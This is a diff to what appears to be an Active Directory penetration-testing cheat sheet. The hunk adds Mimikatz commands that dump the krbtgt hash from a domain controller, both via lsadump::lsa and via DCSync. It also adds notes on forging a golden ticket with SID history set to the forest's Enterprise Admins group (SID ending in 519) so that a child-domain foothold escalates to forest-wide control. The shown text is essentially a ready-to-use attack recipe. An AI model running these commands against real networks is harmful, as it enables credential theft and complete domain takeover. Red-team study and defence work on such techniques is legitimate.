@@ -748,12 +748,15 @@ Enter-PSSession <COMPUTERNAME>
 - Abuses SID History
 #### Get krbtgt hash from dc
 ```
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername <DC>
 ```
 
 #### Create TGT and inject in current session
 - The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
 - ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
+- Also possible to use the <DOMAIN SID>-519 (519 is the enterprise admin group)
+- Remove ```/ptt``` to save ticket to file
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
 ```
